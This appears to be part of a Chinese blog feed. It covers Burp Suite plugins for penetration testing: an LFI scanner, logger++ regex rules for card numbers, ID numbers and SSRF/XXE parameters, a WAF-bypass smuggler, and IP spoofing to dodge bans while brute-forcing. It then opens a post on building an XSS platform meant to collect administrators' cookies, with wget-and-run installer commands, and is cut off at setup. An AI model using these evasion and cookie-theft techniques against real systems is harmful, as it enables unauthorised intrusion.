data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015155940.png" class="lozad"></p><p>工具会自动帮我们解出来，你也可以复制 JWT 到里面工具窗口下解密</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160140.png" class="lozad"></p><h1 id="0x13-LFI-scanner-checks"><a href="#0x13-LFI-scanner-checks" class="headerlink" title="0x13 LFI scanner checks"></a>0x13 LFI scanner checks</h1><h2 id="13-1-介绍"><a href="#13-1-介绍" class="headerlink" title="13.1 介绍"></a>13.1 介绍</h2><p>这个工具是 检测本地文件包含漏洞的，LFI scanner checks插件 lufei  写的，freebuf  上有介绍<a href="https://www.freebuf.com/sectool/75118.html" target="_blank" rel="noopener">传送门</a></p><h2 id="13-2-下载"><a href="#13-2-下载" class="headerlink" title="13.2 下载"></a>13.2 下载</h2><blockquote><p>链接: <a href="http://pan.baidu.com/s/1gdfITIN" target="_blank" rel="noopener">http://pan.baidu.com/s/1gdfITIN</a> 密码: 4fv7</p></blockquote><h2 id="13-3-安装"><a href="#13-3-安装" class="headerlink" title="13.3 安装"></a>13.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160627.png" class="lozad"></p><h2 id="13-4-使用"><a href="#13-4-使用" class="headerlink" title="13.4 使用"></a>13.4 使用</h2><p>访问漏洞页面，burp 抓包，发送到主动扫描</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160731.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160745.png" class="lozad"></p><p>PAYLOAD:</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160809.png" class="lozad"></p><p>扫描结果</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015160829.png" class="lozad"></p><h1 id="0x14-logger"><a href="#0x14-logger" class="headerlink" title="0x14 logger++"></a>0x14 logger++</h1><h2 id="14-1-介绍"><a href="#14-1-介绍" class="headerlink" title="14.1 介绍"></a>14.1 介绍</h2><p>跟 http history 差不过，记录的更加全面了，字段也多了几个</p><h2 id="14-2-下载"><a href="#14-2-下载" class="headerlink" title="14.2 下载"></a>14.2 下载</h2><blockquote><p><a href="https://github.com/nccgroup/BurpSuiteLoggerPlusPlus" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteLoggerPlusPlus</a></p></blockquote><h2 id="14-3-安装"><a href="#14-3-安装" class="headerlink" title="14.3 安装"></a>14.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161137.png" class="lozad"></p><h2 id="14-4-使用"><a href="#14-4-使用" class="headerlink" title="14.4 使用"></a>14.4 使用</h2><p>正常开代理就行，不用管，跟 http history 一样<br>下图是 logger 和 burp 自带的对比</p><p>【burp history】</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161500.png" class="lozad"></p><p>【logger++】</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015161530.png" class="lozad"></p><p>【功能介绍】</p><ol><li>View logs</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162358.png" class="lozad"></p><ol start="2"><li>过滤器使用</li></ol><p>在过滤器空白处鼠标右键，会出现你要用匹配的位置，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162458.png" class="lozad"></p><p>比如返回包的 body</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162713.png" class="lozad"></p><ol start="3"><li>Grep values</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162739.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015162812.png" class="lozad"></p><ol start="4"><li>Filter library</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163025.png" class="lozad"></p><p>比如我随便找一个匹配邮箱的正则，放进去。之后点击 set as logfilter</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163052.png" class="lozad"></p><p>点击跳转了，进行匹配</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163111.png" class="lozad"></p><ol start="5"><li>Options</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015163134.png" class="lozad"></p><h2 id="14-5-规则库"><a href="#14-5-规则库" class="headerlink" title="14.5 规则库"></a>14.5 规则库</h2><ol><li>JSON帖子响应中的卡号</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;post&quot; &amp;&amp; Response.MimeType == &quot;json&quot; &amp;&amp; Response.Body == &quot;/(?:4[0-9]&#123;12&#125;(?:[0-9]&#123;3&#125;)?|(?:5[1-5][0-9]&#123;2&#125;|222[1-9]|22[3-9][0-9]|2[3-6][0-9]&#123;2&#125;|27[01][0-9]|2720)[0-9]&#123;12&#125;|3[47][0-9]&#123;13&#125;|3(?:0[0-5]|[68][0-9])[0-9]&#123;11&#125;|6(?:011|5[0-9]&#123;2&#125;)[0-9]&#123;12&#125;|(?:2131|1800|35d&#123;3&#125;)d&#123;11&#125;)/&quot;</span><br></pre></td></tr></table></figure><ol start="2"><li><h3 id="敏感信息内网IP"><a href="#敏感信息内网IP" class="headerlink" title="敏感信息内网IP"></a>敏感信息内网IP</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Body == &quot;/(10(.(25[0-5]|2[0-4][0-9]|1[0-9]&#123;1,2&#125;|[0-9]&#123;1,2&#125;))&#123;3&#125;|((172.(1[6-9]|2[0-9]|3[01]))|192.168)(.(25[0-5]|2[0-4][0-9]|1[0-9]&#123;1,2&#125;|[0-9]&#123;1,2&#125;))&#123;2&#125;)/&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>常规IP地址（包括外网）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(?:(?:^|\.)(?:2(?:5[0-5]|[0-4]\d)|1?\d?\d))&#123;4&#125;/</span><br></pre></td></tr></table></figure><ol start="4"><li><h3 id="敏感信息手机号"><a href="#敏感信息手机号" class="headerlink" title="敏感信息手机号"></a>敏感信息手机号</h3><p>手机号（存在单词边界）</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /\b(1[3-9](\d&#123;9&#125;))\b/</span><br></pre></td></tr></table></figure><p>​                手机号（误报多）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(1[3-9](\d&#123;9&#125;))/</span><br></pre></td></tr></table></figure><ol start="5"><li><h3 id="敏感信息电子邮件"><a href="#敏感信息电子邮件" class="headerlink" title="敏感信息电子邮件"></a>敏感信息电子邮件</h3><p>通用电子邮件地址匹配</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]&#123;2,4&#125;))/</span><br></pre></td></tr></table></figure><p>​                 匹配特定邮箱    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@example.com)/</span><br></pre></td></tr></table></figure><p>​                 模糊匹配关键字邮箱</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /(([A-Za-z0-9_\-\.])+\@(.*)example(.*))/</span><br></pre></td></tr></table></figure><ol start="5"><li><h3 id="敏感信息身份证号"><a href="#敏感信息身份证号" class="headerlink" title="敏感信息身份证号"></a>敏感信息身份证号</h3><p>身份证号</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 简易正则</span><br><span class="line">RESPONSE == /((\d&#123;6&#125;)(18|19|20)?(\d&#123;2&#125;)([01]\d)([0123]\d)(\d&#123;3&#125;)(\d|X))/</span><br><span class="line"></span><br><span class="line"># 出现图片误报</span><br><span class="line">RESPONSE == /((\d&#123;6&#125;)(18|19|20)?(\d&#123;2&#125;)([01]\d)([0123]\d)(\d&#123;3&#125;)(\d|X))/ &amp;&amp; MIMETYPE != &quot;jpeg&quot;</span><br></pre></td></tr></table></figure><ol start="6"><li><h3 id="潜在的CORS配置不当"><a href="#潜在的CORS配置不当" class="headerlink" title="潜在的CORS配置不当"></a>潜在的CORS配置不当</h3><p>具有允许凭证＃1的空CORS响应</p><p>CORS响应头为空＃1</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;/Access-Control-Allow-Origin: null/&quot;</span><br></pre></td></tr></table></figure><p>​                具有允许凭证＃2的空CORS响应</p><p>​                CORS响应头为空＃2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers == &quot;Access-Control-Allow-Origin: */&quot;</span><br></pre></td></tr></table></figure><ol start="7"><li><h3 id="点击劫持（Clickjacking）"><a href="#点击劫持（Clickjacking）" class="headerlink" title="点击劫持（Clickjacking）"></a>点击劫持（Clickjacking）</h3><p>缺少X帧选项</p><p>通用X-FRAME-OPTIONS响应头</p><p><a href="https://tools.ietf.org/html/rfc7034" target="_blank" rel="noopener">https://tools.ietf.org/html/rfc7034</a></p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Response.Headers != &quot;/X-FRAME-OPTIONS/ &quot;</span><br></pre></td></tr></table></figure><p>​                缺少内容安全政策</p><p>​                国会CSP响应头</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSEHEADERS != /Content-Security-Policy/</span><br></pre></td></tr></table></figure><p>​                内容安全策略头中主要是与<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors" target="_blank" rel="noopener">frame-ancestors</a>相关的细分</p><ol start="8"><li><h3 id="寻找潜在的SSRF-开放重定向"><a href="#寻找潜在的SSRF-开放重定向" class="headerlink" title="寻找潜在的SSRF /开放重定向"></a>寻找潜在的SSRF /开放重定向</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 根据响应头</span><br><span class="line">Response.Headers == &quot;(Location)&quot;</span><br><span class="line"></span><br><span class="line"># 根据参数名称</span><br><span class="line">Request.Query == &quot;(url(.*)=)&quot; || Request.URL == &quot;(url(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(uri(.*)=)&quot; || Request.URL == &quot;(uri(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(path(.*)=)&quot; || Request.URL == &quot;(path(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(href(.*)=)&quot; || Request.URL == &quot;(href(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(redirect(.*)=)&quot; || Request.URL == &quot;(redirect(.*)=)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 寻找参数中的图片</span><br><span class="line">Request.Query == &quot;(img(.*)=)&quot; ||  Request.HasParams == &quot;(img(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(pic(.*)=)&quot; || Request.HasParams == &quot;(pic(.*)=)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.png)&quot; || Request.HasParams == &quot;(\.png)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.jpg)&quot; || Request.HasParams== &quot;(\.jpg)&quot;</span><br><span class="line">|| Request.Query == &quot;(\.gif)&quot; || Request.HasParams == &quot;(\.gif)&quot;</span><br></pre></td></tr></table></figure><ol start="9"><li><h3 id="JSONP调用"><a href="#JSONP调用" class="headerlink" title="JSONP调用"></a>JSONP调用</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 基于参数</span><br><span class="line">Request.HasParams == &quot;(callback(.*)=)&quot; || Request.Query == &quot;(callback(.*)=)&quot; || Request.HasGetParam == &quot;(callback(.*)=)&quot; || Request.HasPostParam == &quot;(callback(.*)=)&quot;</span><br><span class="line"></span><br><span class="line"># 基于响应特征</span><br><span class="line">HTTP记录量大时容易长耗时</span><br><span class="line">Response.Headers == &quot;(.+\(\[(.*)\]\))&quot; &amp;&amp; Response.Headers == &quot;application\&quot;json&quot;</span><br></pre></td></tr></table></figure><ol start="10"><li><h3 id="寻找潜在的XXE"><a href="#寻找潜在的XXE" class="headerlink" title="寻找潜在的XXE"></a>寻找潜在的XXE</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 根据 content-type</span><br><span class="line">Request.Headers == &quot;application\&quot;xml&quot; || Request.Headers == &quot;text\&quot;xml&quot; ||</span><br><span class="line">Request.Headers == &quot;Content-Type: application\&quot;xml&quot;</span><br><span class="line"></span><br><span class="line"># 根据 POST 参数</span><br><span class="line">Request.HasPostParam == &quot;&lt;\?xml version=&quot;1\.&quot;</span><br></pre></td></tr></table></figure><ol start="11"><li><h3 id="编辑器"><a href="#编辑器" class="headerlink" title="编辑器"></a>编辑器</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /ueditor/</span><br></pre></td></tr></table></figure><ol start="12"><li><h3 id="RPO相对路径重构"><a href="#RPO相对路径重构" class="headerlink" title="RPO相对路径重构"></a>RPO相对路径重构</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RESPONSE == /=\.\.\//</span><br></pre></td></tr></table></figure><ol start="13"><li><h3 id="潜在越权点"><a href="#潜在越权点" class="headerlink" title="潜在越权点"></a>潜在越权点</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 基于参数名称</span><br><span class="line">Request.HasParams == &quot;(_id(.*)=)&quot; || Request.Query == &quot;(_id(.*)=)&quot; ||</span><br><span class="line">Request.HasParams == &quot;(id(.*)=)&quot; || Request.Query == &quot;(id(.*)=)&quot; ||</span><br><span class="line">Request.HasParams == &quot;((I|i)(D|d)(.*)=)&quot; || Request.Query == &quot;((I|i)(D|d)(.*)=)&quot;</span><br></pre></td></tr></table></figure><ol start="14"><li><h3 id="其他敏感参数"><a href="#其他敏感参数" class="headerlink" title="其他敏感参数"></a>其他敏感参数</h3></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Request.Query == &quot;(sql(.*)=)&quot; || Request.Headers == &quot;(sql(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(exec(.*)=)&quot; || Request.Headers == &quot;(exec(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(script(.*)=)&quot; || Request.Headers == &quot;(script(.*)=)&quot; ||</span><br><span class="line">Request.Query == &quot;(src(.*)=)&quot; || Request.Headers == &quot;(src(.*)=)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>logger++规则库参考链接：</p><p><a href="https://www.itcodemonkey.com/article/14521.html" target="_blank" rel="noopener">https://www.itcodemonkey.com/article/14521.html</a></p><p><a href="http://wp.blkstone.me/2019/04/burp-suite-logger-filter-rules/" target="_blank" rel="noopener">http://wp.blkstone.me/2019/04/burp-suite-logger-filter-rules/</a></p></blockquote><h1 id="0x15-HTTPS-muggler"><a href="#0x15-HTTPS-muggler" class="headerlink" title="0x15 HTTPS-muggler"></a>0x15 <strong>HTTPS-muggler</strong></h1><h2 id="15-1-介绍"><a href="#15-1-介绍" class="headerlink" title="15.1 介绍"></a>15.1 介绍</h2><p>Burp Suite扩展，可帮助渗透测试人员使用多种技术绕过WAF或测试其有效性</p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling</a></p><h2 id="15-2-下载"><a href="#15-2-下载" class="headerlink" title="15.2 下载"></a>15.2 下载</h2><blockquote><p><a href="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/releases" target="_blank" rel="noopener">https://github.com/nccgroup/BurpSuiteHTTPSmuggler/releases</a></p></blockquote><h2 id="15-3-安装"><a href="#15-3-安装" class="headerlink" title="15.3 安装"></a>15.3 安装</h2><p>在burp extender模块加载插件 ，与之前的插件安装类似，将下载来下的插件jar包复制到burpsuite的插件文件夹中，然后再burp suite的extender模块去导入jar包即可。</p><h2 id="15-4-使用"><a href="#15-4-使用" class="headerlink" title="15.4 使用"></a>15.4 使用</h2><p><img alt="AppSec EU 18-example1" data-src="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/raw/master/screenshots/AppSecEU18-example1.jpg?raw=true" class="lozad"></p><p><img alt="AppSec EU 18-example2" data-src="https://github.com/nccgroup/BurpSuiteHTTPSmuggler/raw/master/screenshots/AppSecEU18-example2.jpg?raw=true" class="lozad"></p><h1 id="0x16-Passive-Scan-Client"><a href="#0x16-Passive-Scan-Client" class="headerlink" title="0x16 Passive Scan Client"></a>0x16 Passive Scan Client</h1><h2 id="16-1-介绍"><a href="#16-1-介绍" class="headerlink" title="16.1 介绍"></a>16.1 介绍</h2><p>被动扫描流量转发插件</p><h2 id="16-2-下载"><a href="#16-2-下载" class="headerlink" title="16.2 下载"></a>16.2 下载</h2><blockquote><p><a href="https://github.com/c0ny1/passive-scan-client" target="_blank" rel="noopener">https://github.com/c0ny1/passive-scan-client</a></p></blockquote><h2 id="16-3-安装"><a href="#16-3-安装" class="headerlink" title="16.3 安装"></a>16.3 安装</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185322.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185334.png" class="lozad"></p><h2 id="16-4-使用"><a href="#16-4-使用" class="headerlink" title="16.4 使用"></a>16.4 使用</h2><ol><li>访问靶机，点击插件的 run  就可以了</li></ol><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185402.png" class="lozad"></p><ol start="2"><li><p>结合被动扫描插件使用</p><p>a.开启插件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185505.png" class="lozad"></p><p>b. 选择一个扫描器，我这里用的长亭的，将代理设置为插件的地址和端口</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185520.png" class="lozad"></p><p>c.访问网站</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191015185545.png" class="lozad"></p><blockquote><p>ps:扫描器可自行选择</p></blockquote></li></ol><h1 id="0x17-burpFakeIP"><a href="#0x17-burpFakeIP" class="headerlink" title="0x17 burpFakeIP"></a>0x17 <strong>burpFakeIP</strong></h1><h2 id="17-1-介绍"><a href="#17-1-介绍" class="headerlink" title="17.1 介绍"></a>17.1 介绍</h2><p>burpFakeIP是一个可以伪造IP的插件，在渗透测试的过程中，通常可能会对某个参数进行爆破，但是却很容易被封ip，所以可以通过这款插件来配合爆破，效果极佳。</p><h2 id="17-2-下载"><a href="#17-2-下载" class="headerlink" title="17.2 下载"></a>17.2 下载</h2><blockquote><p><a href="https://github.com/TheKingOfDuck/burpFakeIP" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/burpFakeIP</a></p></blockquote><h2 id="17-3-安装"><a href="#17-3-安装" class="headerlink" title="17.3 安装"></a>17.3 安装</h2><p>需要选择python</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191018160450.png" class="lozad"></p><h2 id="17-4-使用"><a href="#17-4-使用" class="headerlink" title="17.4 使用"></a>17.4 使用</h2><p>4个小功能</p><ul><li>伪造指定ip</li><li>伪造本地ip</li><li>伪造随机ip</li><li>随机ip爆破</li></ul><h3 id="17-4-1-伪造指定ip"><a href="#17-4-1-伪造指定ip" class="headerlink" title="17.4.1 伪造指定ip"></a>17.4.1 伪造指定ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>inputIP</code>功能,然后输入指定的ip：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597184839805.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597184839805.png" class="lozad"></a></p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597185444300.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597185444300.png" class="lozad"></a></p><p>程序会自动添加所有可伪造得字段到请求头中。</p><h3 id="17-4-2-伪造本地ip"><a href="#17-4-2-伪造本地ip" class="headerlink" title="17.4.2 伪造本地ip"></a>17.4.2 伪造本地ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>127.0.0.1</code>功能：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597186627939.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597186627939.png" class="lozad"></a></p><h3 id="17-4-3-伪造随机ip"><a href="#17-4-3-伪造随机ip" class="headerlink" title="17.4.3 伪造随机ip"></a>17.4.3 伪造随机ip</h3><p>在<code>Repeater</code>模块右键选择<code>fakeIp</code>菜单,然后点击<code>randomIP</code>功能：</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597187304576.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597187304576.png" class="lozad"></a></p><h3 id="17-4-4-随机ip爆破"><a href="#17-4-4-随机ip爆破" class="headerlink" title="17.4.4 随机ip爆破"></a>17.4.4 随机ip爆破</h3><p><strong>伪造随机ip爆破是本插件最核心的功能。</strong></p><p>将数据包发送到<code>Intruder</code>模块,在<code>Positions</code>中切换<code>Attack type</code>为<code>Pitchfork</code>模式,选择好有效的伪造字段,以及需要爆破的字段:</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597190596991.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597190596991.png" class="lozad"></a></p><p>按照箭头顺序将Payload来源设置为<code>Extensin-generated</code>,并设置负载伪<code>fakeIpPayloads</code>,然后设置第二个变量。 <a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597191239161.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597191239161.png" class="lozad"></a></p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597192426317.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597192426317.png" class="lozad"></a></p><p>点击<code>Start attack</code>开始爆破.</p><p><a href="https://github.com/TheKingOfDuck/BurpFakeIP/blob/master/images/15597193222287.png" target="_blank" rel="noopener"><img alt="img" data-src="https://github.com/TheKingOfDuck/BurpFakeIP/raw/master/images/15597193222287.png" class="lozad"></a></p><p>如上图,实现每次爆破都使用不同的伪ip进行,避免被ban。</p><blockquote><p>PS：伪造随机ip爆破的先决条件可以伪造ip绕过服务器限制。</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS平台的搭建</title>
      <link href="/2019/09/29/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
      <url>/2019/09/29/XSS%E5%B9%B3%E5%8F%B0%E7%9A%84%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    XSS——跨站脚本攻击，是一个主流的web安全漏洞，主要分为反射型、存储型和DOM型。攻击者可以利用XSS漏洞获取管理员的cookie信息，然后使用该cookie信息登陆到系统后台，从而进一步攻破系统。而打管理员cookie信息的平台就叫XSS平台，晚上也有很多搭建好的，虽然也能注册使用，但是你打到的cookie别人也能看到，这样的话，总感觉不安全，所以就自己搭建了一个平台自己使用，哈哈哈。</p><a id="more"></a><h1 id="0x01-环境需求"><a href="#0x01-环境需求" class="headerlink" title="0x01 环境需求"></a>0x01 环境需求</h1><blockquote><p>vps：1G 512M即可 <a href="[https://billing.virmach.com](https://billing.virmach.com/)">传送门</a></p><p>域名：<a href="https://dnspod.cloud.tencent.com/" target="_blank" rel="noopener">腾讯云</a>  <a href="https://wanwang.aliyun.com/" target="_blank" rel="noopener">阿里云</a></p><p>宝塔面板</p><p>PHP 7版本</p><p>XSS平台源码 </p></blockquote><h1 id="0x02-vps购买"><a href="#0x02-vps购买" class="headerlink" title="0x02 vps购买"></a>0x02 vps购买</h1><p>可参考<a href="[https://www.mad-coding.cn/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/#0x01-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87](https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/#0x01-环境准备)">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x03-域名购买"><a href="#0x03-域名购买" class="headerlink" title="0x03 域名购买"></a>0x03 域名购买</h1><p>可参考[<a href="https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/">https://www.mad-coding.cn/2019/08/09/onedrive-oneindex打造属于自己的个人网盘/</a></p><h1 id="0x04-宝塔面板的安装"><a href="#0x04-宝塔面板的安装" class="headerlink" title="0x04 宝塔面板的安装"></a>0x04 宝塔面板的安装</h1><p>大家根据自己的vps系统选择对应的安装脚本命令，一件之行安装，非常方便</p><p><strong>entos**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian**</strong>安装命令：**</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora**</strong>安装命令<strong>**:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="LNMP环境的安装"><a href="#LNMP环境的安装" class="headerlink" title="LNMP环境的安装"></a>LNMP环境的安装</h2><p>输入你的vps IP:8888宝塔面板后台，然后会弹出让你选择安装LAMP环境还是LNMP环境，我使用的是LNMP环境，记住PHP版本需要使用7版本以上。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191115163235.png" class="lozad"></p><h1 id="0x05-开始搭建"><a href="#0x05-开始搭建" class="headerlink" title="0x05 开始搭建"></a>0x05 开始搭建</h1><h2 id="5-1-新建站点"><a href="#5-1-新建站点" class="headerlink" title="5.1 新建站点"></a>5.1 